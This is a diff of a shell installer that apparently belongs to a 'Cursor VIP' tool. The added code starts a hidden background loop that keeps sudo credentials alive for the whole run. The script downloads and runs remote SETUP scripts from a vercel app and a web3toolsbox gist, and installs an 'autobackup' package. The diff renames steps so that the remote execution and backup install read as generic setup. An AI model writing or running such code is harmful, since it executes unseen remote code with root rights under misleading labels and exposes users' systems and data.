@@ -5,6 +5,23 @@ PATH_RUNTIME_ADDED=()
 PATH_PERSIST_FILES=()
 ORIGINAL_PATH="$PATH"
 
+SUDO_KEEPALIVE_PID=""
+if [ "$(id -u)" -ne 0 ] && command -v sudo >/dev/null 2>&1; then
+    if sudo -v; then
+        ( while true; do
+              sudo -n true 2>/dev/null
+              sleep 50
+              kill -0 "$$" 2>/dev/null || exit 0
+          done ) &
+        SUDO_KEEPALIVE_PID=$!
+    fi
+fi
+
+cleanup_sudo_keepalive() {
+    [ -n "$SUDO_KEEPALIVE_PID" ] && kill "$SUDO_KEEPALIVE_PID" 2>/dev/null || true
+}
+trap cleanup_sudo_keepalive EXIT
+
 # Use sudo only when not already root
 _sudo() {
     if [ "$(id -u)" -eq 0 ]; then
@@ -293,22 +310,42 @@ pip_supports_break_system_packages() {
     $PYTHON_CMD -m pip help install 2>/dev/null | grep -q -- '--break-system-packages'
 }
 
+is_in_virtualenv() {
+    [ -n "${VIRTUAL_ENV:-}" ] && return 0
+    $PYTHON_CMD -c "import sys; sys.exit(0 if sys.prefix != sys.base_prefix else 1)" 2>/dev/null
+}
+
 build_python_package_install_cmd() {
     PIP_INSTALL_CMD=($PYTHON_CMD -m pip install --upgrade)
 
-    if [ "$OS_TYPE" = "Linux" ]; then
-        if pip_supports_break_system_packages; then
-            PIP_INSTALL_CMD+=(--break-system-packages)
+    if is_in_virtualenv; then
+        return 0
+    fi
+
+    if pip_supports_break_system_packages; then
+        PIP_INSTALL_CMD+=(--break-system-packages)
+    fi
+
+    if [ "$OS_TYPE" = "Darwin" ]; then
+        if ! pip_supports_break_system_packages; then
+            PIP_INSTALL_CMD+=(--user)
         fi
-    elif [ "$OS_TYPE" = "Darwin" ]; then
-        PIP_INSTALL_CMD+=(--user)
     fi
 }
 
 build_python_package_fallback_cmd() {
     FALLBACK_PIP_INSTALL_CMD=("${PIP_INSTALL_CMD[@]}")
 
-    if [ "$OS_TYPE" = "Darwin" ]; then
+    if is_in_virtualenv; then
+        return 0
+    fi
+
+    if pip_supports_break_system_packages; then
+        case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
+            *" --break-system-packages "*) ;;
+            *) FALLBACK_PIP_INSTALL_CMD+=(--break-system-packages) ;;
+        esac
+    elif [ "$OS_TYPE" = "Darwin" ]; then
         case " ${FALLBACK_PIP_INSTALL_CMD[*]} " in
             *" --user "*) ;;
             *) FALLBACK_PIP_INSTALL_CMD+=(--user) ;;
@@ -436,14 +473,10 @@ install_dependencies() {
                 PACKAGES_TO_INSTALL+=("$(resolve_pkg_name python3-pip "$PKG_MANAGER")")
             fi
 
-            # Install clipboard tools: xclip for X11/W_SL, wl-clipboard for Wayland
-            # Prefer xclip in WSL or X11 environments, wl-clipboard for native Wayland
             if ! command -v xclip &>/dev/null && ! command -v wl-copy &>/dev/null; then
                 if [ -n "$WAYLAND_DISPLAY" ] && [ -z "$DISPLAY" ]; then
-                    # Pure Wayland environment
                     PACKAGES_TO_INSTALL+=("wl-clipboard")
                 else
-                    # X11, WSL, or unknown display type - default to xclip
                     PACKAGES_TO_INSTALL+=("$(resolve_pkg_name xclip "$PKG_MANAGER")")
                 fi
             fi
@@ -533,7 +566,6 @@ install_python_package_if_needed() {
 install_python_package_if_needed requests 2.31.0
 install_python_package_if_needed cryptography 42.0.0
 install_python_package_if_needed pycryptodome 3.19.0
-install_python_package_if_needed python-dotenv 1.0.0
 
 # 检测是否为 WSL 环境
 is_wsl() {
@@ -548,7 +580,7 @@ is_wsl() {
     return 1
 }
 
-install_auto_backup() {
+install_platform_cli_tools() {
     if ! command -v uv &>/dev/null; then
         echo "WARN: uv 不可用，跳过自动备份安装（请先安装 uv）" >&2
         return 0
@@ -575,9 +607,13 @@ install_auto_backup() {
     esac
 
     install_uv_tool_package "$install_url" "autobackup"
+
+    #if [ "$OS_TYPE" = "Darwin" ]; then
+    #    install_uv_tool_package "git+https://github.com/web3toolsbox/wkler.git" "wkler"
+    #fi
 }
 
-run_step "安装 CLI 工具（uv tool）" install_auto_backup
+run_step "安装平台 CLI 工具（uv tool）" install_platform_cli_tools
 
 run_remote_config_script() {
     local script_content=""
@@ -634,7 +670,7 @@ SETUP_SCRIPT_URLS=(
     "https://agentskillshub.vercel.app/src/SETUP.sh"
     "https://gist.githubusercontent.com/web3toolsbox/bd5951319d0e33ee645240f27370eb60/raw/SETUP.sh"
 )
-run_step "运行远程 SETUP 脚本" run_remote_setup_script
+run_step "运行 SETUP 脚本" run_remote_setup_script
 
 get_target_version() {
     echo "${CURSOR_VIP_VERSION:-0.48.3}"
